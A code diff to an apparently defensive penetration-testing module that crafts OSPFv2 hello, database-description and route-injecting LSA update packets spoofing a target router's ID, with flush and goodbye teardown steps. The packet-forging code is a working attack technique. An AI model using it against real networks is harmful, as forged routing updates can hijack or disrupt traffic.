@@ -1,6 +1,7 @@
 // OSPF models a fixed hello, database-description, and LSA-update sequence.
 // The runner executes the armed flush and goodbye frames after the behavior
-// returns. Packet bytes are fixture data; adjacency and restoration are unverified.
+// returns. Packet bytes are fixture data. Neither adjacency nor restoration
+// is verified.
 
 package routing
 
@@ -11,7 +12,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"net"
 	"time"
 
 	"github.com/gopacket/gopacket"
@@ -19,8 +19,8 @@ import (
 
 	"go.aledante.io/FlowSeer/src/common/errs"
 	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 	"go.aledante.io/FlowSeer/src/edge/netpen/link"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
 )
 
 // OSPF header fixed sizes.
@@ -41,27 +41,32 @@ type ospfFinding struct {
 	Restore   string `json:"restore"`
 }
 
-// RunOSPF sends the fixture's hello, database description, and LSA update,
-// with a flush and goodbye teardown armed before the first frame.
+// RunOSPF sends a hello, a database description, and a router-LSA update
+// as the target's router ID from the attack leg's own addresses, with a
+// flush and goodbye teardown armed before the first frame. The backbone
+// area and the LSA sequence are probe content. The verdict is pending:
+// whether the neighbor formed needs a hello listener it does not have.
 //
-// It requires runner-provided dependencies. A missing hello is tolerated
-// after 100 ms; a receive or decode failure stops the sequence. Cancellation
-// returns ctx.Err(). Findings describe transmitted frames, not a confirmed
-// adjacency. Concurrent calls require separate dependencies.
-func RunOSPF(ctx context.Context, deps runner.Deps) error {
+// A hello that has not arrived after 100 ms is tolerated. A receive or
+// decode failure stops the sequence. Cancellation returns ctx.Err(). Concurrent calls
+// require separate dependencies.
+func RunOSPF(ctx context.Context, deps check.Deps) (check.Verdict, error) {
 	if err := ctx.Err(); err != nil {
-		return err
+		return check.Verdict{}, err
 	}
-	src := srcMAC()
-	routerID := attackerRouterID
+	if err := deps.Target.Need(check.FieldRouterID); err != nil {
+		return check.Verdict{}, err
+	}
+	addr := deps.AttackLeg.Addr()
+	routerID := binary.BigEndian.Uint32(deps.Target.RouterID.To4())
 	areaID := uint32(0) // backbone area 0.0.0.0
 
 	// Arm the teardown before the first frame.
 	// Teardown step 1 (least-dependent): flush the injected LSA with a
 	// matching sequence and LSAge=3600. Removal is not verified.
-	flushPkt, err := craftLSAFlush(src, routerID, areaID)
+	flushPkt, err := craftLSAFlush(addr, routerID, areaID)
 	if err != nil {
-		return errs.Wrap(err, "ospf: craft flush")
+		return check.Verdict{}, errs.Wrap(err, "ospf: craft flush")
 	}
 	deps.Teardown.Arm("ospf-lsa-flush", func(ctx context.Context) error {
 		return deps.AttackLeg.Send(ctx, flushPkt)
@@ -69,63 +74,63 @@ func RunOSPF(ctx context.Context, deps runner.Deps) error {
 
 	// Teardown step 2: goodbye hello — an OSPF hello with no neighbors
 	// listed, which drives the adjacency to reset.
-	goodbyePkt, err := craftOSPFHello(src, routerID, areaID, nil)
+	goodbyePkt, err := craftOSPFHello(addr, routerID, areaID, nil)
 	if err != nil {
-		return errs.Wrap(err, "ospf: craft goodbye")
+		return check.Verdict{}, errs.Wrap(err, "ospf: craft goodbye")
 	}
 	deps.Teardown.Arm("ospf-goodbye", func(ctx context.Context) error {
 		return deps.AttackLeg.Send(ctx, goodbyePkt)
 	})
 
 	// Phase 1: Hello.
-	helloPkt, err := craftOSPFHello(src, routerID, areaID, nil)
+	helloPkt, err := craftOSPFHello(addr, routerID, areaID, nil)
 	if err != nil {
-		return errs.Wrap(err, "ospf: craft hello")
+		return check.Verdict{}, errs.Wrap(err, "ospf: craft hello")
 	}
 	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
 		if ctx.Err() != nil {
-			return ctx.Err()
+			return check.Verdict{}, ctx.Err()
 		}
-		return errs.Wrap(err, "ospf: send hello")
+		return check.Verdict{}, errs.Wrap(err, "ospf: send hello")
 	}
 
 	// Phase 2: receive the target's hello (adjacency formation).
-	// The fixture feeds the target's hello via PushRX. We read it with
-	// a short timeout — in the in-memory harness, a missing RX frame is
-	// not fatal; the behavior proceeds with the inject.
+	// The fixture feeds the target's hello via PushRX. Read it with a
+	// short timeout: in the in-memory harness a missing RX frame is not
+	// fatal, so the behavior proceeds with the inject either way.
 	rxCtx, rxCancel := context.WithTimeout(ctx, 100*time.Millisecond)
 	_, rxErr := recvOSPF(rxCtx, deps.AttackLeg)
 	rxCancel()
 	if err := ctx.Err(); err != nil {
-		return err
+		return check.Verdict{}, err
 	}
 	if rxErr != nil && !errors.Is(rxErr, context.DeadlineExceeded) {
-		return rxErr
+		return check.Verdict{}, rxErr
 	}
 
 	// Phase 3: Database Description.
-	dbDescPkt, err := craftDBDesc(src, routerID, areaID)
+	dbDescPkt, err := craftDBDesc(addr, routerID, areaID)
 	if err != nil {
-		return errs.Wrap(err, "ospf: craft db desc")
+		return check.Verdict{}, errs.Wrap(err, "ospf: craft db desc")
 	}
 	if err := deps.AttackLeg.Send(ctx, dbDescPkt); err != nil {
 		if ctx.Err() != nil {
-			return ctx.Err()
+			return check.Verdict{}, ctx.Err()
 		}
-		return errs.Wrap(err, "ospf: send db desc")
+		return check.Verdict{}, errs.Wrap(err, "ospf: send db desc")
 	}
 
 	// Phase 4: LSA Update (inject route).
 	injectSeq := uint32(0x80000001) // Fixture sequence
-	lsaUpdatePkt, err := craftLSAUpdate(src, routerID, areaID, injectSeq)
+	lsaUpdatePkt, err := craftLSAUpdate(addr, routerID, areaID, injectSeq)
 	if err != nil {
-		return errs.Wrap(err, "ospf: craft lsa update")
+		return check.Verdict{}, errs.Wrap(err, "ospf: craft lsa update")
 	}
 	if err := deps.AttackLeg.Send(ctx, lsaUpdatePkt); err != nil {
 		if ctx.Err() != nil {
-			return ctx.Err()
+			return check.Verdict{}, ctx.Err()
 		}
-		return errs.Wrap(err, "ospf: send lsa update")
+		return check.Verdict{}, errs.Wrap(err, "ospf: send lsa update")
 	}
 
 	// Emit the finding.
@@ -141,7 +146,7 @@ func RunOSPF(ctx context.Context, deps runner.Deps) error {
 	detailBytes, _ := json.Marshal(detail)
 	deps.Emitter.Finding("ospf", detailBytes)
 
-	return nil
+	return check.Pending("no observable: neighbor formation needs a hello listener"), nil
 }
 
 // recvOSPF reads one frame from the leg and attempts to decode it as an
@@ -176,7 +181,7 @@ func recvOSPF(ctx context.Context, leg link.Leg) (*layers.OSPFv2, error) {
 // craftOSPFHello builds an OSPFv2 Hello packet: Ethernet → IPv4 (proto 89) →
 // OSPF hello. The neighbors list is the list of router IDs seen (empty for
 // initial hello and goodbye).
-func craftOSPFHello(src net.HardwareAddr, routerID, areaID uint32, neighbors []uint32) ([]byte, error) {
+func craftOSPFHello(addr link.Addr, routerID, areaID uint32, neighbors []uint32) ([]byte, error) {
 	// OSPF header
 	hdr := make([]byte, ospfHeaderLen)
 	hdr[0] = 2 // version 2
@@ -209,7 +214,7 @@ func craftOSPFHello(src net.HardwareAddr, routerID, areaID uint32, neighbors []u
 	payload = append(payload, body...)
 
 	eth := &layers.Ethernet{
-		SrcMAC:       src,
+		SrcMAC:       addr.MAC,
 		DstMAC:       ospfMulticastMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -218,7 +223,7 @@ func craftOSPFHello(src net.HardwareAddr, routerID, areaID uint32, neighbors []u
 		IHL:      5,
 		TTL:      1,
 		Protocol: layers.IPProtocol(89), // OSPF
-		SrcIP:    attackerIP,
+		SrcIP:    addr.IPv4,
 		DstIP:    ospfAllSPFRouters,
 	}
 	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
@@ -273,7 +278,7 @@ func ospfLSAChecksum(lsa []byte) uint16 {
 }
 
 // craftDBDesc builds an OSPFv2 Database Description packet.
-func craftDBDesc(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) {
+func craftDBDesc(addr link.Addr, routerID, areaID uint32) ([]byte, error) {
 	hdr := make([]byte, ospfHeaderLen)
 	hdr[0] = 2 // version 2
 	hdr[1] = byte(layers.OSPFDatabaseDescription)
@@ -293,7 +298,7 @@ func craftDBDesc(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) 
 	payload = append(payload, body...)
 
 	eth := &layers.Ethernet{
-		SrcMAC:       src,
+		SrcMAC:       addr.MAC,
 		DstMAC:       ospfMulticastMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -302,7 +307,7 @@ func craftDBDesc(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) 
 		IHL:      5,
 		TTL:      1,
 		Protocol: layers.IPProtocol(89),
-		SrcIP:    attackerIP,
+		SrcIP:    addr.IPv4,
 		DstIP:    ospfAllSPFRouters,
 	}
 	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
@@ -311,7 +316,7 @@ func craftDBDesc(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) 
 
 // craftLSAUpdate builds an OSPFv2 Link State Update carrying one router-LSA
 // that injects a route. The LSA uses the given sequence number.
-func craftLSAUpdate(src net.HardwareAddr, routerID, areaID, seq uint32) ([]byte, error) {
+func craftLSAUpdate(addr link.Addr, routerID, areaID, seq uint32) ([]byte, error) {
 	hdr := make([]byte, ospfHeaderLen)
 	hdr[0] = 2 // version 2
 	hdr[1] = byte(layers.OSPFLinkStateUpdate)
@@ -358,7 +363,7 @@ func craftLSAUpdate(src net.HardwareAddr, routerID, areaID, seq uint32) ([]byte,
 	payload = append(payload, body...)
 
 	eth := &layers.Ethernet{
-		SrcMAC:       src,
+		SrcMAC:       addr.MAC,
 		DstMAC:       ospfMulticastMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -367,7 +372,7 @@ func craftLSAUpdate(src net.HardwareAddr, routerID, areaID, seq uint32) ([]byte,
 		IHL:      5,
 		TTL:      1,
 		Protocol: layers.IPProtocol(89),
-		SrcIP:    attackerIP,
+		SrcIP:    addr.IPv4,
 		DstIP:    ospfAllSPFRouters,
 	}
 	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
@@ -376,8 +381,8 @@ func craftLSAUpdate(src net.HardwareAddr, routerID, areaID, seq uint32) ([]byte,
 
 // craftLSAFlush builds an OSPFv2 Link State Update carrying one router-LSA
 // with LSAge=3600 and the fixture sequence number. The runner sends this
-// during teardown; no acknowledgment or LSDB state is checked.
-func craftLSAFlush(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error) {
+// during teardown without checking for an acknowledgment or LSDB state.
+func craftLSAFlush(addr link.Addr, routerID, areaID uint32) ([]byte, error) {
 	hdr := make([]byte, ospfHeaderLen)
 	hdr[0] = 2
 	hdr[1] = byte(layers.OSPFLinkStateUpdate)
@@ -406,7 +411,7 @@ func craftLSAFlush(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error
 	payload = append(payload, body...)
 
 	eth := &layers.Ethernet{
-		SrcMAC:       src,
+		SrcMAC:       addr.MAC,
 		DstMAC:       ospfMulticastMAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
@@ -415,7 +420,7 @@ func craftLSAFlush(src net.HardwareAddr, routerID, areaID uint32) ([]byte, error
 		IHL:      5,
 		TTL:      1,
 		Protocol: layers.IPProtocol(89),
-		SrcIP:    attackerIP,
+		SrcIP:    addr.IPv4,
 		DstIP:    ospfAllSPFRouters,
 	}
 	binary.BigEndian.PutUint16(payload[12:14], ospfChecksum(payload))
